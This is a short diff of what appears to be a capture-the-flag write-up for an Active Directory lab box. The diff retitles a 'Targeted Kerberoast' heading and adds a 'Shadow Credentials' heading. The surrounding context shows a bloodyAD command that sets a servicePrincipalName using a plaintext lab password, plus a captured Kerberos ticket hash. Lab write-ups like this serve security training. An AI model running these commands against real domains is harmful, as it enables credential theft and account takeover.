@@ -544,7 +544,7 @@ So now im part of the `network audit` group i can abuse GenericWrite
 
 Ill start by trying a targeted kerberoast
 
-## Targeted Kerbo
+## Targeted Kerberoast (Fail!)
 
 ```python
 faketime -f +7h bloodyAD --host dc.absolute.htb -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k set object 'winrm_user' servicePrincipalName -v 'service/hacked'
@@ -566,6 +566,8 @@ LDAP        dc.absolute.htb 389    DC               $krb5tgs$23$*winrm_user$ABSO
 Now ill dump the hash, once again E type 23, so thats RC4 hashing algorithm
 
 The hash did not crack! So ill try a shadow credentials attack
+
+## Shadow Credentials
 
 
 
